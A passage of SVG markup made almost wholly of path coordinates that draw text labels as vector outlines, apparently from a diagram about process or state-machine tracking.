1.015625 -1.15625 2.734375zm11.523804 3.90625l2.203125 -0.34375q0.1875 1.328125 1.03125 2.03125q0.84375 0.703125 2.359375 0.703125q1.546875 0 2.28125 -0.625q0.75 -0.625 0.75 -1.46875q0 -0.75 -0.65625 -1.1875q-0.46875 -0.296875 -2.28125 -0.75q-2.453125 -0.625 -3.40625 -1.078125q-0.9375 -0.453125 -1.421875 -1.25q-0.484375 -0.796875 -0.484375 -1.75q0 -0.890625 0.390625 -1.625q0.40625 -0.75 1.09375 -1.25q0.53125 -0.390625 1.421875 -0.65625q0.890625 -0.265625 1.921875 -0.265625q1.546875 0 2.71875 0.453125q1.171875 0.4375 1.71875 1.203125q0.5625 0.765625 0.765625 2.03125l-2.171875 0.296875q-0.140625 -1.015625 -0.859375 -1.578125q-0.71875 -0.5625 -2.015625 -0.5625q-1.53125 0 -2.1875 0.5q-0.65625 0.5 -0.65625 1.1875q0 0.4375 0.28125 0.78125q0.265625 0.359375 0.84375 0.59375q0.34375 0.125 1.96875 0.5625q2.359375 0.640625 3.296875 1.046875q0.9375 0.390625 1.46875 1.15625q0.53125 0.765625 0.53125 1.90625q0 1.109375 -0.65625 2.09375q-0.640625 0.984375 -1.875 1.53125q-1.21875 0.53125 -2.765625 0.53125q-2.5625 0 -3.90625 -1.0625q-1.328125 -1.0625 -1.703125 -3.15625zm12.6640625 0l2.203125 -0.34375q0.1875 1.328125 1.03125 2.03125q0.84375 0.703125 2.359375 0.703125q1.546875 0 2.28125 -0.625q0.75 -0.625 0.75 -1.46875q0 -0.75 -0.65625 -1.1875q-0.46875 -0.296875 -2.28125 -0.75q-2.453125 -0.625 -3.40625 -1.078125q-0.9375 -0.453125 -1.421875 -1.25q-0.484375 -0.796875 -0.484375 -1.75q0 -0.890625 0.390625 -1.625q0.40625 -0.75 1.09375 -1.25q0.53125 -0.390625 1.421875 -0.65625q0.890625 -0.265625 1.921875 -0.265625q1.546875 0 2.71875 0.453125q1.171875 0.4375 1.71875 1.203125q0.5625 0.765625 0.765625 2.03125l-2.171875 0.296875q-0.140625 -1.015625 -0.859375 -1.578125q-0.71875 -0.5625 -2.015625 -0.5625q-1.53125 0 -2.1875 0.5q-0.65625 0.5 -0.65625 1.1875q0 0.4375 0.28125 0.78125q0.265625 0.359375 0.84375 0.59375q0.34375 0.125 1.96875 0.5625q2.359375 0.640625 3.296875 1.046875q0.9375 0.390625 1.46875 1.15625q0.53125 0.765625 0.53125 1.90625q0 1.109375 -0.65625 2.09375q-0.640625 0.984375 -1.875 1.53125q-1.21875 0.53125 -2.765625 0.53125q-2.5625 0 -3.90625 -1.0625q-1.328125 -1.0625 -1.703125 -3.15625zm25.024597 3.921875l0 -15.984375l-5.96875 0l0 -2.140625l14.375 0l0 2.140625l-6.0 0l0 15.984375l-2.40625 0zm9.609497 0l0 -13.140625l2.0 0l0 2.0q0.78125 -1.40625 1.421875 -1.84375q0.65625 -0.453125 1.4375 -0.453125q1.125 0 2.28125 0.71875l-0.765625 2.078125q-0.8125 -0.484375 -1.640625 -0.484375q-0.71875 0 -1.3125 0.4375q-0.578125 0.4375 -0.828125 1.21875q-0.359375 1.1875 -0.359375 2.59375l0 6.875l-2.234375 0zm17.028198 -1.625q-1.234375 1.0625 -2.375 1.5q-1.140625 0.421875 -2.453125 0.421875q-2.171875 0 -3.328125 -1.046875q-1.15625 -1.0625 -1.15625 -2.71875q0 -0.953125 0.4375 -1.75q0.4375 -0.796875 1.140625 -1.28125q0.71875 -0.484375 1.609375 -0.734375q0.65625 -0.171875 1.96875 -0.328125q2.703125 -0.328125 3.96875 -0.765625q0.015625 -0.46875 0.015625 -0.59375q0 -1.359375 -0.625 -1.90625q-0.859375 -0.765625 -2.53125 -0.765625q-1.578125 0 -2.328125 0.5625q-0.75 0.546875 -1.109375 1.9375l-2.171875 -0.296875q0.296875 -1.390625 0.96875 -2.25q0.6875 -0.859375 1.96875 -1.328125q1.296875 -0.46875 2.984375 -0.46875q1.6875 0 2.734375 0.40625q1.046875 0.390625 1.546875 1.0q0.5 0.59375 0.6875 1.5q0.125 0.578125 0.125 2.0625l0 2.96875q0 3.09375 0.140625 3.921875q0.140625 0.828125 0.5625 1.578125l-2.328125 0q-0.34375 -0.6875 -0.453125 -1.625zm-0.1875 -4.96875q-1.203125 0.5 -3.625 0.84375q-1.375 0.203125 -1.953125 0.453125q-0.5625 0.234375 -0.875 0.71875q-0.296875 0.46875 -0.296875 1.046875q0 0.890625 0.671875 1.484375q0.671875 0.59375 1.96875 0.59375q1.28125 0 2.28125 -0.5625q1.0 -0.5625 1.484375 -1.53125q0.34375 -0.75 0.34375 -2.234375l0 -0.8125zm14.273804 1.78125l2.1875 0.28125q-0.34375 2.265625 -1.828125 3.546875q-1.484375 1.28125 -3.625 1.28125q-2.703125 0 -4.34375 -1.765625q-1.640625 -1.765625 -1.640625 -5.046875q0 -2.125 0.703125 -3.71875q0.71875 -1.59375 2.15625 -2.390625q1.4375 -0.8125 3.125 -0.8125q2.140625 0 3.5 1.09375q1.359375 1.078125 1.75 3.0625l-2.171875 0.34375q-0.296875 -1.328125 -1.09375 -1.984375q-0.78125 -0.671875 -1.890625 -0.671875q-1.6875 0 -2.734375 1.203125q-1.046875 1.203125 -1.046875 3.8125q0 2.640625 1.015625 3.84375q1.015625 1.203125 2.640625 1.203125q1.3125 0 2.1875 -0.796875q0.875 -0.8125 1.109375 -2.484375zm4.1171875 4.8125l0 -18.125l2.21875 0l0 10.328125l5.265625 -5.34375l2.890625 0l-5.03125 4.875l5.53125 8.265625l-2.75 0l-4.328125 -6.71875l-1.578125 1.515625l0 5.203125l-2.21875 0zm21.632812 -4.234375l2.296875 0.296875q-0.53125 2.015625 -2.015625 3.125q-1.46875 1.109375 -3.75 1.109375q-2.890625 0 -4.578125 -1.765625q-1.6875 -1.78125 -1.6875 -4.984375q0 -3.3125 1.703125 -5.140625q1.71875 -1.84375 4.4375 -1.84375q2.640625 0 4.296875 1.796875q1.671875 1.796875 1.671875 5.046875q0 0.203125 -0.015625 0.59375l-9.78125 0q0.109375 2.171875 1.203125 3.328125q1.109375 1.140625 2.765625 1.140625q1.21875 0 2.078125 -0.640625q0.875 -0.640625 1.375 -2.0625zm-7.3125 -3.59375l7.34375 0q-0.15625 -1.65625 -0.84375 -2.484375q-1.0625 -1.28125 -2.75 -1.28125q-1.546875 0 -2.59375 1.03125q-1.03125 1.015625 -1.15625 2.734375zm12.383179 7.828125l0 -13.140625l2.0 0l0 2.0q0.78125 -1.40625 1.421875 -1.84375q0.65625 -0.453125 1.4375 -0.453125q1.125 0 2.28125 0.71875l-0.765625 2.078125q-0.8125 -0.484375 -1.640625 -0.484375q-0.71875 0 -1.3125 0.4375q-0.578125 0.4375 -0.828125 1.21875q-0.359375 1.1875 -0.359375 2.59375l0 6.875l-2.234375 0zm14.627686 -5.4375l0 -2.25l6.84375 0l0 2.25l-6.84375 0zm15.815186 -0.390625l2.265625 -0.1875q0.15625 1.359375 0.734375 2.234375q0.59375 0.859375 1.828125 1.40625q1.234375 0.53125 2.78125 0.53125q1.375 0 2.421875 -0.40625q1.0625 -0.40625 1.5625 -1.109375q0.515625 -0.71875 0.515625 -1.5625q0 -0.859375 -0.5 -1.484375q-0.484375 -0.640625 -1.625 -1.078125q-0.71875 -0.28125 -3.21875 -0.875q-2.5 -0.609375 -3.5 -1.140625q-1.296875 -0.671875 -1.9375 -1.671875q-0.640625 -1.015625 -0.640625 -2.265625q0 -1.375 0.78125 -2.5625q0.78125 -1.203125 2.265625 -1.8125q1.5 -0.625 3.34375 -0.625q2.015625 0 3.546875 0.65625q1.546875 0.640625 2.375 1.90625q0.828125 1.25 0.890625 2.859375l-2.3125 0.171875q-0.171875 -1.71875 -1.25 -2.59375q-1.0625 -0.890625 -3.15625 -0.890625q-2.171875 0 -3.171875 0.796875q-1.0 0.796875 -1.0 1.921875q0 0.984375 0.703125 1.609375q0.703125 0.640625 3.625 1.296875q2.921875 0.65625 4.015625 1.15625q1.578125 0.734375 2.328125 1.859375q0.765625 1.109375 0.765625 2.5625q0 1.453125 -0.84375 2.734375q-0.828125 1.28125 -2.375 2.0q-1.546875 0.703125 -3.484375 0.703125q-2.46875 0 -4.140625 -0.71875q-1.65625 -0.71875 -2.609375 -2.15625q-0.9375 -1.4375 -0.984375 -3.265625zm22.284302 3.84375l0.3125 1.953125q-0.9375 0.203125 -1.671875 0.203125q-1.21875 0 -1.890625 -0.375q-0.65625 -0.390625 -0.9375 -1.015625q-0.265625 -0.625 -0.265625 -2.625l0 -7.5625l-1.640625 0l0 -1.734375l1.640625 0l0 -3.25l2.21875 -1.328125l0 4.578125l2.234375 0l0 1.734375l-2.234375 0l0 7.6875q0 0.953125 0.109375 1.234375q0.125 0.265625 0.390625 0.421875q0.265625 0.15625 0.75 0.15625q0.375 0 0.984375 -0.078125zm10.740051 0.359375q-1.234375 1.0625 -2.375 1.5q-1.140625 0.421875 -2.453125 0.421875q-2.171875 0 -3.328125 -1.046875q-1.15625 -1.0625 -1.15625 -2.71875q0 -0.953125 0.4375 -1.75q0.4375 -0.796875 1.140625 -1.28125q0.71875 -0.484375 1.609375 -0.734375q0.65625 -0.171875 1.96875 -0.328125q2.703125 -0.328125 3.96875 -0.765625q0.015625 -0.46875 0.015625 -0.59375q0 -1.359375 -0.625 -1.90625q-0.859375 -0.765625 -2.53125 -0.765625q-1.578125 0 -2.328125 0.5625q-0.75 0.546875 -1.109375 1.9375l-2.171875 -0.296875q0.296875 -1.390625 0.96875 -2.25q0.6875 -0.859375 1.96875 -1.328125q1.296875 -0.46875 2.984375 -0.46875q1.6875 0 2.734375 0.40625q1.046875 0.390625 1.546875 1.0q0.5 0.59375 0.6875 1.5q0.125 0.578125 0.125 2.0625l0 2.96875q0 3.09375 0.140625 3.921875q0.140625 0.828125 0.5625 1.578125l-2.328125 0q-0.34375 -0.6875 -0.453125 -1.625zm-0.1875 -4.96875q-1.203125 0.5 -3.625 0.84375q-1.375 0.203125 -1.953125 0.453125q-0.5625 0.234375 -0.875 0.71875q-0.296875 0.46875 -0.296875 1.046875q0 0.890625 0.671875 1.484375q0.671875 0.59375 1.96875 0.59375q1.28125 0 2.28125 -0.5625q1.0 -0.5625 1.484375 -1.53125q0.34375 -0.75 0.34375 -2.234375l0 -0.8125zm10.570679 4.609375l0.3125 1.953125q-0.9375 0.203125 -1.671875 0.203125q-1.21875 0 -1.890625 -0.375q-0.65625 -0.390625 -0.9375 -1.015625q-0.265625 -0.625 -0.265625 -2.625l0 -7.5625l-1.640625 0l0 -1.734375l1.640625 0l0 -3.25l2.21875 -1.328125l0 4.578125l2.234375 0l0 1.734375l-2.234375 0l0 7.6875q0 0.953125 0.109375 1.234375q0.125 0.265625 0.390625 0.421875q0.265625 0.15625 0.75 0.15625q0.375 0 0.984375 -0.078125zm11.161987 -2.25l2.296875 0.296875q-0.53125 2.015625 -2.015625 3.125q-1.46875 1.109375 -3.75 1.109375q-2.890625 0 -4.578125 -1.765625q-1.6875 -1.78125 -1.6875 -4.984375q0 -3.3125 1.703125 -5.140625q1.71875 -1.84375 4.4375 -1.84375q2.640625 0 4.296875 1.796875q1.671875 1.796875 1.671875 5.046875q0 0.203125 -0.015625 0.59375l-9.78125 0q0.109375 2.171875 1.203125 3.328125q1.109375 1.140625 2.765625 1.140625q1.21875 0 2.078125 -0.640625q0.875 -0.640625 1.375 -2.0625zm-7.3125 -3.59375l7.34375 0q-0.15625 -1.65625 -0.84375 -2.484375q-1.0625 -1.28125 -2.75 -1.28125q-1.546875 0 -2.59375 1.03125q-1.03125 1.015625 -1.15625 2.734375z" fill-rule="nonzero"/>&lt;path fill="#000000" d="m472.06558 304.28894l0 -13.140625l1.984375 0l0 1.84375q0.625 -0.953125 1.640625 -1.546875q1.03125 -0.59375 2.34375 -0.59375q1.46875 0 2.390625 0.609375q0.9375 0.609375 1.328125 1.703125q1.546875 -2.3125 4.046875 -2.3125q1.953125 0 3.0 1.09375q1.0625 1.078125 1.0625 3.328125l0 9.015625l-2.21875 0l0 -8.28125q0 -1.328125 -0.21875 -1.90625q-0.21875 -0.59375 -0.78125 -0.953125q-0.5625 -0.359375 -1.328125 -0.359375q-1.390625 0 -2.3125 0.921875q-0.90625 0.921875 -0.90625 2.953125l0 7.625l-2.234375 0l0 -8.53125q0 -1.484375 -0.546875 -2.21875q-0.53125 -0.75 -1.78125 -0.75q-0.9375 0 -1.734375 0.5q-0.796875 0.484375 -1.15625 1.4375q-0.359375 0.953125 -0.359375 2.75l0 6.8125l-2.21875 0zm29.66101 -1.625q-1.234375 1.0625 -2.375 1.5q-1.140625 0.421875 -2.453125 0.421875q-2.171875 0 -3.328125 -1.046875q-1.15625 -1.0625 -1.15625 -2.71875q0 -0.953125 0.4375 -1.75q0.4375 -0.796875 1.140625 -1.28125q0.71875 -0.484375 1.609375 -0.734375q0.65625 -0.171875 1.96875 -0.328125q2.703125 -0.328125 3.96875 -0.765625q0.015625 -0.46875 0.015625 -0.59375q0 -1.359375 -0.625 -1.90625q-0.859375 -0.765625 -2.53125 -0.765625q-1.578125 0 -2.328125 0.5625q-0.75 0.546875 -1.109375 1.9375l-2.171875 -0.296875q0.296875 -1.390625 0.96875 -2.25q0.6875 -0.859375 1.96875 -1.328125q1.296875 -0.46875 2.984375 -0.46875q1.6875 0 2.734375 0.40625q1.046875 0.390625 1.546875 1.0q0.5 0.59375 0.6875 1.5q0.125 0.578125 0.125 2.0625l0 2.96875q0 3.09375 0.140625 3.921875q0.140625 0.828125 0.5625 1.578125l-2.328125 0q-0.34375 -0.6875 -0.453125 -1.625zm-0.1875 -4.96875q-1.203125 0.5 -3.625 0.84375q-1.375 0.203125 -1.953125 0.453125q-0.5625 0.234375 -0.875 0.71875q-0.296875 0.46875 -0.296875 1.046875q0 0.890625 0.671875 1.484375q0.671875 0.59375 1.96875 0.59375q1.28125 0 2.28125 -0.5625q1.0 -0.5625 1.484375 -1.53125q0.34375 -0.75 0.34375 -2.234375l0 -0.8125zm14.273834 1.78125l2.1875 0.28125q-0.34375 2.265625 -1.828125 3.546875q-1.484375 1.28125 -3.625 1.28125q-2.7031555 0 -4.3437805 -1.765625q-1.640625 -1.765625 -1.640625 -5.046875q0 -2.125 0.703125 -3.71875q0.71875 -1.59375 2.15625 -2.390625q1.4375 -0.8125 3.1250305 -0.8125q2.140625 0 3.5 1.09375q1.359375 1.078125 1.75 3.0625l-2.171875 0.34375q-0.296875 -1.328125 -1.09375 -1.984375q-0.78125 -0.671875 -1.890625 -0.671875q-1.6875305 0 -2.7344055 1.203125q-1.046875 1.203125 -1.046875 3.8125q0 2.640625 1.015625 3.84375q1.015625 1.203125 2.6406555 1.203125q1.3125 0 2.1875 -0.796875q0.875 -0.8125 1.109375 -2.484375zm4.1015625 4.8125l0 -18.125l2.21875 0l0 6.5q1.5625 -1.8125 3.9375 -1.8125q1.453125 0 2.53125 0.578125q1.078125 0.578125 1.546875 1.59375q0.46875 1.015625 0.46875 2.9375l0 8.328125l-2.234375 0l0 -8.328125q0 -1.671875 -0.734375 -2.421875q-0.71875 -0.765625 -2.03125 -0.765625q-1.0 0 -1.875 0.515625q-0.859375 0.515625 -1.234375 1.390625q-0.375 0.875 -0.375 2.421875l0 7.1875l-2.21875 0zm14.101929 -15.578125l0 -2.546875l2.21875 0l0 2.546875l-2.21875 0zm0 15.578125l0 -13.140625l2.21875 0l0 13.140625l-2.21875 0zm5.61145 0l0 -13.140625l2.0 0l0 1.875q1.453125 -2.171875 4.1875 -2.171875q1.1875 0 2.171875 0.4375q1.0 0.421875 1.484375 1.125q0.5 0.6875 0.703125 1.640625q0.125 0.609375 0.125 2.15625l0 8.078125l-2.234375 0l0 -7.984375q0 -1.359375 -0.265625 -2.03125q-0.25 -0.6875 -0.90625 -1.078125q-0.65625 -0.40625 -1.546875 -0.40625q-1.421875 0 -2.46875 0.90625q-1.03125 0.890625 -1.03125 3.421875l0 7.171875l-2.21875 0zm23.070679 -4.234375l2.296875 0.296875q-0.53125 2.015625 -2.015625 3.125q-1.46875 1.109375 -3.75 1.109375q-2.890625 0 -4.578125 -1.765625q-1.6875 -1.78125 -1.6875 -4.984375q0 -3.3125 1.703125 -5.140625q1.71875 -1.84375 4.4375 -1.84375q2.640625 0 4.296875 1.796875q1.671875 1.796875 1.671875 5.046875q0 0.203125 -0.015625 0.59375l-9.78125 0q0.109375 2.171875 1.203125 3.328125q1.109375 1.140625 2.765625 1.140625q1.21875 0 2.078125 -0.640625q0.875 -0.640625 1.375 -2.0625zm-7.3125 -3.59375l7.34375 0q-0.15625 -1.65625 -0.84375 -2.484375q-1.0625 -1.28125 -2.75 -1.28125q-1.546875 0 -2.59375 1.03125q-1.03125 1.015625 -1.15625 2.734375zm24.310791 5.84375l0.3125 1.953125q-0.9375 0.203125 -1.671875 0.203125q-1.21875 0 -1.890625 -0.375q-0.65625 -0.390625 -0.9375 -1.015625q-0.265625 -0.625 -0.265625 -2.625l0 -7.5625l-1.640625 0l0 -1.734375l1.640625 0l0 -3.25l2.21875 -1.328125l0 4.578125l2.234375 0l0 1.734375l-2.234375 0l0 7.6875q0 0.953125 0.109375 1.234375q0.125 0.265625 0.390625 0.421875q0.265625 0.15625 0.75 0.15625q0.375 0 0.984375 -0.078125zm2.1463623 1.984375l0 -13.140625l2.0 0l0 2.0q0.78125 -1.40625 1.421875 -1.84375q0.65625 -0.453125 1.4375 -0.453125q1.125 0 2.28125 0.71875l-0.765625 2.078125q-0.8125 -0.484375 -1.640625 -0.484375q-0.71875 0 -1.3125 0.4375q-0.578125 0.4375 -0.828125 1.21875q-0.359375 1.1875 -0.359375 2.59375l0 6.875l-2.234375 0zm17.028198 -1.625q-1.234375 1.0625 -2.375 1.5q-1.140625 0.421875 -2.453125 0.421875q-2.171875 0 -3.328125 -1.046875q-1.15625 -1.0625 -1.15625 -2.71875q0 -0.953125 0.4375 -1.75q0.4375 -0.796875 1.140625 -1.28125q0.71875 -0.484375 1.609375 -0.734375q0.65625 -0.171875 1.96875 -0.328125q2.703125 -0.328125 3.96875 -0.765625q0.015625 -0.46875 0.015625 -0.59375q0 -1.359375 -0.625 -1.90625q-0.859375 -0.765625 -2.53125 -0.765625q-1.578125 0 -2.328125 0.5625q-0.75 0.546875 -1.109375 1.9375l-2.171875 -0.296875q0.296875 -1.390625 0.96875 -2.25q0.6875 -0.859375 1.96875 -1.328125q1.296875 -0.46875 2.984375 -0.46875q1.6875 0 2.734375 0.40625q1.046875 0.390625 1.546875 1.0q0.5 0.59375 0.6875 1.5q0.125 0.578125 0.125 2.0625l0 2.96875q0 3.09375 0.140625 3.921875q0.140625 0.828125 0.5625 1.578125l-2.328125 0q-0.34375 -0.6875 -0.453125 -1.625zm-0.1875 -4.96875q-1.203125 0.5 -3.625 0.84375q-1.375 0.203125 -1.953125 0.453125q-0.5625 0.234375 -0.875 0.71875q-0.296875 0.46875 -0.296875 1.046875q0 0.890625 0.671875 1.484375q0.671875 0.59375 1.96875 0.59375q1.28125 0 2.28125 -0.5625q1.0 -0.5625 1.484375 -1.53125q0.34375 -0.75 0.34375 -2.234375l0 -0.8125zm14.273804 1.78125l2.1875 0.28125q-0.34375 2.265625 -1.828125 3.546875q-1.484375 1.28125 -3.625 1.28125q-2.703125 0 -4.34375 -1.765625q-1.640625 -1.765625 -1.640625 -5.046875q0 -2.125 0.703125 -3.71875q0.71875 -1.59375 2.15625 -2.390625q1.4375 -0.8125 3.125 -0.8125q2.140625 0 3.5 1.09375q1.359375 1.078125 1.75 3.0625l-2.171875 0.34375q-0.296875 -1.328125 -1.09375 -1.984375q-0.78125 -0.671875 -1.890625 -0.671875q-1.6875 0 -2.734375 1.203125q-1.046875 1.203125 -1.046875 3.8125q0 2.640625 1.015625 3.84375q1.015625 1.203125 2.640625 1.203125q1.3125 0 2.1875 -0.796875q0.875 -0.8125 1.109375 -2.484375zm4.1171875 4.8125l0 -18.125l2.21875 0l0 10.328125l5.265625 -5.34375l2.890625 0l-5.03125 4.875l5.53125 8.265625l-2.75 0l-4.328125 -6.71875l-1.578125 1.515625l0 5.203125l-2.21875 0zm12.6640625 -15.578125l0 -2.546875l2.21875 0l0 2.546875l-2.21875 0zm0 15.578125l0 -13.140625l2.21875 0l0 13.140625l-2.21875 0zm5.61145 0l0 -13.140625l2.0 0l0 1.875q1.453125 -2.171875 4.1875 -2.171875q1.1875 0 2.171875 0.4375q1.0 0.421875 1.484375 1.125q0.5 0.6875 0.703125 1.640625q0.125 0.609375 0.125 2.15625l0 8.078125l-2.234375 0l0 -7.984375q0 -1.359375 -0.265625 -2.03125q-0.25 -0.6875 -0.90625 -1.078125q-0.65625 -0.40625 -1.546875 -0.40625q-1.421875 0 -2.46875 0.90625q-1.03125 0.890625 -1.03125 3.421875l0 7.171875l-2.21875 0zm13.680054 1.09375l2.15625 0.3125q0.140625 1.0 0.765625 1.46875q0.828125 0.609375 2.25 0.609375q1.546875 0 2.390625 -0.625q0.84375 -0.609375 1.140625 -1.71875q0.171875 -0.6875 0.15625 -2.859375q-1.453125 1.71875 -3.625 1.71875q-2.71875 0 -4.203125 -1.953125q-1.484375 -1.953125 -1.484375 -4.6875q0 -1.875 0.671875 -3.46875q0.6875 -1.59375 1.984375 -2.453125q1.296875 -0.875 3.03125 -0.875q2.328125 0 3.84375 1.890625l0 -1.59375l2.046875 0l0 11.359375q0 3.0625 -0.625 4.34375q-0.625 1.28125 -1.984375 2.015625q-1.34375 0.75 -3.328125 0.75q-2.34375 0 -3.796875 -1.0625q-1.4375 -1.046875 -1.390625 -3.171875zm1.84375 -7.890625q0 2.578125 1.015625 3.765625q1.03125 1.1875 2.578125 1.1875q1.53125 0 2.5625 -1.171875q1.046875 -1.1875 1.046875 -3.71875q0 -2.40625 -1.078125 -3.625q-1.0625 -1.234375 -2.5625 -1.234375q-1.484375 0 -2.53125 1.21875q-1.03125 1.203125 -1.03125 3.578125z" fill-rule="nonzero"/>&lt;path fill="#000000" d="m472.06558 339.3202l0 -18.171875l2.03125 0l0 1.71875q0.71875 -1.0 1.609375 -1.5q0.90625 -0.515625 2.1875 -0.515625q1.6875 0 2.96875 0.875q1.296875 0.859375 1.953125 2.4375q0.65625 1.578125 0.65625 3.453125q0 2.015625 -0.734375 3.640625q-0.71875 1.609375 -2.09375 2.46875q-1.375 0.859375 -2.90625 0.859375q-1.109375 0 -2.0 -0.46875q-0.875 -0.46875 -1.453125 -1.1875l0 6.390625l-2.21875 0zm2.015625 -11.53125q0 2.546875 1.015625 3.765625q1.03125 1.203125 2.5 1.203125q1.484375 0 2.53125 -1.25q1.0625 -1.265625 1.0625 -3.890625q0 -2.515625 -1.03125 -3.765625q-1.03125 -1.25 -2.46875 -1.25q-1.421875 0 -2.515625 1.328125q-1.09375 1.328125 -1.09375 3.859375zm12.039429 6.5l0 -13.140625l2.0 0l0 2.0q0.78125 -1.40625 1.421875 -1.84375q0.65625 -0.453125 1.4375 -0.453125q1.125 0 2.28125 0.71875l-0.765625 2.078125q-0.8125 -0.484375 -1.640625 -0.484375q-0.71875 0 -1.3125 0.4375q-0.578125 0.4375 -0.828125 1.21875q-0.359375 1.1875 -0.359375 2.59375l0 6.875l-2.234375 0zm7.6375732 -6.5625q0 -3.65625 2.03125 -5.40625q1.6875 -1.46875 4.125 -1.46875q2.703125 0 4.421875 1.78125q1.71875 1.78125 1.71875 4.90625q0 2.53125 -0.765625 3.984375q-0.75 1.453125 -2.203125 2.265625q-1.453125 0.796875 -3.171875 0.796875q-2.765625 0 -4.46875 -1.765625q-1.6875 -1.765625 -1.6875 -5.09375zm2.28125 0q0 2.515625 1.09375 3.78125q1.109375 1.25 2.78125 1.25q1.65625 0 2.75 -1.265625q1.109375 -1.265625 1.109375 -3.84375q0 -2.4375 -1.109375 -3.6875q-1.109375 -1.265625 -2.75 -1.265625q-1.671875 0 -2.78125 1.25q-1.09375 1.25 -1.09375 3.78125zm21.19571 1.75l2.1875 0.28125q-0.34375 2.265625 -1.828125 3.546875q-1.484375 1.28125 -3.625 1.28125q-2.7031555 0 -4.3437805 -1.765625q-1.640625 -1.765625 -1.640625 -5.046875q0 -2.125 0.703125 -3.71875q0.71875 -1.59375 2.15625 -2.390625q1.4375305 -0.8125 3.1250305 -0.8125q2.140625 0 3.5 1.09375q1.359375 1.078125 1.75 3.0625l-2.171875 0.34375q-0.296875 -1.328125 -1.09375 -1.984375q-0.78125 -0.671875 -1.890625 -0.671875q-1.6875 0 -2.7344055 1.203125q-1.046875 1.203125 -1.046875 3.8125q0 2.640625 1.015625 3.84375q1.0156555 1.203125 2.6406555 1.203125q1.3125 0 2.1875 -0.796875q0.875 -0.8125 1.109375 -2.484375zm13.0859375 0.578125l2.296875 0.296875q-0.53125 2.015625 -2.015625 3.125q-1.46875 1.109375 -3.75 1.109375q-2.890625 0 -4.578125 -1.765625q-1.6875 -1.78125 -1.6875 -4.984375q0 -3.3125 1.703125 -5.140625q1.71875 -1.84375 4.4375 -1.84375q2.640625 0 4.296875 1.796875q1.671875 1.796875 1.671875 5.046875q0 0.203125 -0.015625 0.59375l-9.78125 0q0.109375 2.171875 1.203125 3.328125q1.109375 1.140625 2.765625 1.140625q1.21875 0 2.078125 -0.640625q0.875 -0.640625 1.375 -2.0625zm-7.3125 -3.59375l7.34375 0q-0.15625 -1.65625 -0.84375 -2.484375q-1.0625 -1.28125 -2.75 -1.28125q-1.546875 0 -2.59375 1.03125q-1.03125 1.015625 -1.15625 2.734375zm11.523804 3.90625l2.203125 -0.34375q0.1875 1.328125 1.03125 2.03125q0.84375 0.703125 2.359375 0.703125q1.546875 0 2.28125 -0.625q0.75 -0.625 0.75 -1.46875q0 -0.75 -0.65625 -1.1875q-0.46875 -0.296875 -2.28125 -0.75q-2.453125 -0.625 -3.40625 -1.078125q-0.9375 -0.453125 -1.421875 -1.25q-0.484375 -0.796875 -0.484375 -1.75q0 -0.890625 0.390625 -1.625q0.40625 -0.75 1.09375 -1.25q0.53125 -0.390625 1.421875 -0.65625q0.890625 -0.265625 1.921875 -0.265625q1.546875 0 2.71875 0.453125q1.171875 0.4375 1.71875 1.203125q0.5625 0.765625 0.765625 2.03125l-2.171875 0.296875q-0.140625 -1.015625 -0.859375 -1.578125q-0.71875 -0.5625 -2.015625 -0.5625q-1.53125 0 -2.1875 0.5q-0.65625 0.5 -0.65625 1.1875q0 0.4375 0.28125 0.78125q0.265625 0.359375 0.84375 0.59375q0.34375 0.125 1.96875 0.5625q2.359375 0.640625 3.296875 1.046875q0.9375 0.390625 1.46875 1.15625q0.53125 0.765625 0.53125 1.90625q0 1.109375 -0.65625 2.09375q-0.640625 0.984375 -1.875 1.53125q-1.21875 0.53125 -2.765625 0.53125q-2.5625 0 -3.90625 -1.0625q-1.328125 -1.0625 -1.703125 -3.15625zm12.6640625 0l2.203125 -0.34375q0.1875 1.328125 1.03125 2.03125q0.84375 0.703125 2.359375 0.703125q1.546875 0 2.28125 -0.625q0.75 -0.625 0.75 -1.46875q0 -0.75 -0.65625 -1.1875q-0.46875 -0.296875 -2.28125 -0.75q-2.453125 -0.625 -3.40625 -1.078125q-0.9375 -0.453125 -1.421875 -1.25q-0.484375 -0.796875 -0.484375 -1.75q0 -0.890625 0.390625 -1.625q0.40625 -0.75 1.09375 -1.25q0.53125 -0.390625 1.421875 -0.65625q0.890625 -0.265625 1.921875 -0.265625q1.546875 0 2.71875 0.453125q1.171875 0.4375 1.71875 1.203125q0.5625 0.765625 0.765625 2.03125l-2.171875 0.296875q-0.140625 -1.015625 -0.859375 -1.578125q-0.71875 -0.5625 -2.015625 -0.5625q-1.53125 0 -2.1875 0.5q-0.65625 0.5 -0.65625 1.1875q0 0.4375 0.28125 0.78125q0.265625 0.359375 0.84375 0.59375q0.34375 0.125 1.96875 0.5625q2.359375 0.640625 3.296875 1.046875q0.9375 0.390625 1.46875 1.15625q0.53125 0.765625 0.53125 1.90625q0 1.109375 -0.65625 2.09375q-0.640625 0.984375 -1.875 1.53125q-1.21875 0.53125 -2.765625 0.53125q-2.5625 0 -3.90625 -1.0625q-1.328125 -1.0625 -1.703125 -3.15625zm19.700989 0l2.203125 -0.34375q0.1875 1.328125 1.03125 2.03125q0.84375 0.703125 2.359375 0.703125q1.546875 0 2.28125 -0.625q0.75 -0.625 0.75 -1.46875q0 -0.75 -0.65625 -1.1875q-0.46875 -0.296875 -2.28125 -0.75q-2.453125 -0.625 -3.40625 -1.078125q-0.9375 -0.453125 -1.421875 -1.25q-0.484375 -0.796875 -0.484375 -1.75q0 -0.890625 0.390625 -1.625q0.40625 -0.75 1.09375 -1.25q0.53125 -0.390625 1.421875 -0.65625q0.890625 -0.265625 1.921875 -0.265625q1.546875 0 2.71875 0.453125q1.171875 0.4375 1.71875 1.203125q0.5625 0.765625 0.765625 2.03125l-2.171875 0.296875q-0.140625 -1.015625 -0.859375 -1.578125q-0.71875 -0.5625 -2.015625 -0.5625q-1.53125 0 -2.1875 0.5q-0.65625 0.5 -0.65625 1.1875q0 0.4375 0.28125 0.78125q0.265625 0.359375 0.84375 0.59375q0.34375 0.125 1.96875 0.5625q2.359375 0.640625 3.296875 1.046875q0.9375 0.390625 1.46875 1.15625q0.53125 0.765625 0.53125 1.90625q0 1.109375 -0.65625 2.09375q-0.640625 0.984375 -1.875 1.53125q-1.21875 0.53125 -2.765625 0.53125q-2.5625 0 -3.90625 -1.0625q-1.328125 -1.0625 -1.703125 -3.15625zm18.414062 1.9375l0.3125 1.953125q-0.9375 0.203125 -1.671875 0.203125q-1.21875 0 -1.890625 -0.375q-0.65625 -0.390625 -0.9375 -1.015625q-0.265625 -0.625 -0.265625 -2.625l0 -7.5625l-1.640625 0l0 -1.734375l1.640625 0l0 -3.25l2.21875 